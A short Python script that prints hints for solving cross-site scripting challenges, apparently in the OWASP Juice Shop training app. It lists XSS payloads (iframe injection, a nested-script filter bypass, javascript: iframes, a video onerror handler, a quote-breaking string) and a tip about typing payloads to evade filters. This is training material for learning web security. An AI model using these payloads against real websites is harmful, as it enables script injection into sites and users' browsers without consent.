#!/usr/bin/env python3
"""
The DOM XSS might actually be the "Bonus Payload" challenge
Or we need to find the right vulnerable endpoint
"""

print("="*60)
print("🎯 ALTERNATIVE XSS CHALLENGES TO SOLVE")
print("="*60)

print("""
Since the server blocks XSS on /search, let's try other places:

1. BONUS PAYLOAD CHALLENGE (Level 1)
=====================================
This is probably what you need to solve!
In Firefox console:

location.href = "/#/search?q=<iframe width='100%' height='166' scrolling='no' frameborder='no' allow='autoplay' src='https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true'></iframe>"


2. CLIENT-SIDE XSS PROTECTION (Level 2)
========================================
Try bypassing the filter:
In console:

location.href = "#/search?q=<<script>Foo</script>script>alert(1)</script>"


3. REFLECTED XSS (Level 2)
===========================
Try on the track-result page again but differently:

location.href = "#/track-result?id=<iframe src='javascript:alert(1)'>"


4. VIDEO XSS (Level 6)
======================
Try embedding a video with XSS:

location.href = "#/search?q=<video src='x' onerror='alert(1)'>"


5. PAYBACK TIME CHALLENGE
==========================
Use a different payload that creates an order:

location.href = "#/search?q=');alert(1);//"


THE KEY INSIGHT:
================
The DOM XSS challenge description says to use:
<iframe src="javascript:alert(`xss`)">

But if the server blocks it, the challenge might be:
1. "Bonus Payload" - using a SoundCloud iframe
2. "Client-side XSS Protection" - bypassing filters
3. A different XSS challenge entirely

Try the BONUS PAYLOAD first (option 1 above)!
""")

print("\n" + "="*60)
print("💡 MANUAL APPROACH")
print("="*60)
print("""
If console commands aren't working, try this:

1. Click on the search icon (magnifying glass)
2. In the search box that appears, TYPE (don't paste):
   <iframe src="javascript:alert(1)">
3. Press Enter

Sometimes typing manually bypasses filters that block pasted content!
""")